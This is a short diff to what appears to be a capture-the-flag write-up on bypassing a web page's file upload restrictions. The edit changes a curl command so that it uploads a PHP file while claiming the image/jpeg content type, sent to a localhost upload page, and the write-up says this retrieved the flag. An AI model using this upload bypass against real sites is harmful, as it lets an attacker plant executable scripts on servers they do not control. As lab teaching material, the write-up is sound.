@@ -20,7 +20,7 @@ This vulnerability involved bypassing file upload restrictions on an upload page
 5. **Executing a POST Request:**
    - To further investigate, we executed a POST request using `curl` with the following command:
    ```bash
-   curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@m.php.jpeg;type=image/jpeg' http://localhost/?page=upload
+   curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@m.php;type=image/jpeg' http://localhost/?page=upload
    ```
    - After executing this command, we successfully retrieved the flag.
 
